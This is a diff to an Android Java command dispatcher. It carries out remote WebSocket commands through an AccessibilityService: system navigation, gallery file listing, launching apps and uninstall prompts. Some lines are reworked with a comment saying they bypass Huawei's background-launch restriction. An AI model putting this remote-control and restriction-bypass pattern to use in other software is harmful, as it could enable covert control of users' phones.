@@ -283,29 +283,29 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     }
 
     /**
-     * 导航 / 唤醒屏幕
-     * "ho" → 唤醒屏幕, "bak" → 返回, "rec" → 多任务
+     * 导航
+     * "ho" → HOME, "bak" → 返回, "rec" → 多任务
      */
     private void handleNav(JsonObject payload) {
         String nav = ScreenActionParser.getNav(payload);
         NavAction action = NavAction.fromShortcut(nav);
         Log.d(TAG, "nav: " + nav + " → " + action);
 
+        MyAccessibilityService service = MyAccessibilityService.P();
+        if (service == null) {
+            Log.w(TAG, "nav: AccessibilityService not available");
+            return;
+        }
+
         switch (action) {
-            case WAKE_SCREEN:
-                wakeScreen();
+            case HOME:
+                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                 break;
             case BACK:
+                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
+                break;
             case RECENTS:
-                MyAccessibilityService service = MyAccessibilityService.P();
-                if (service == null) {
-                    Log.w(TAG, "nav: AccessibilityService not available");
-                    return;
-                }
-                int globalAction = (action == NavAction.BACK)
-                    ? AccessibilityService.GLOBAL_ACTION_BACK
-                    : AccessibilityService.GLOBAL_ACTION_RECENTS;
-                service.performGlobalAction(globalAction);
+                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                 break;
             default:
                 Log.w(TAG, "nav: unknown nav=" + nav);
@@ -1213,10 +1213,16 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         new Thread(() -> {
             try {
                 File dir = new File(filepath);
-                if (!dir.exists() || !dir.isDirectory()) return;
+                if (!dir.exists() || !dir.isDirectory()) {
+                    Log.w(TAG, "gallery: dir not found or not directory: " + filepath);
+                    return;
+                }
 
                 File[] allFiles = dir.listFiles();
-                if (allFiles == null) return;
+                if (allFiles == null) {
+                    Log.w(TAG, "gallery: listFiles returned null (permission denied?): " + filepath);
+                    return;
+                }
 
                 String[] exts = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"};
                 int count = 0;
@@ -1333,10 +1339,14 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     private void handleOpenApp(JsonObject payload) {
         String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
         Log.d(TAG, "openApp: " + pkg);
-        Context ctx = getAppContext();
-        if (ctx == null || pkg.isEmpty()) return;
+        if (pkg.isEmpty()) return;
 
         try {
+            // 优先用 AccessibilityService 启动，绕过华为后台启动限制
+            MyAccessibilityService service = MyAccessibilityService.P();
+            Context ctx = service != null ? service : getAppContext();
+            if (ctx == null) return;
+
             Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
             if (intent != null) {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -1354,10 +1364,13 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     private void handleUninstallApp(JsonObject payload) {
         String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
         Log.d(TAG, "uninstallApp: " + pkg);
-        Context ctx = getAppContext();
-        if (ctx == null || pkg.isEmpty()) return;
+        if (pkg.isEmpty()) return;
 
         try {
+            MyAccessibilityService service = MyAccessibilityService.P();
+            Context ctx = service != null ? service : getAppContext();
+            if (ctx == null) return;
+
             Intent intent = new Intent(Intent.ACTION_DELETE);
             intent.setData(Uri.parse("package:" + pkg));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
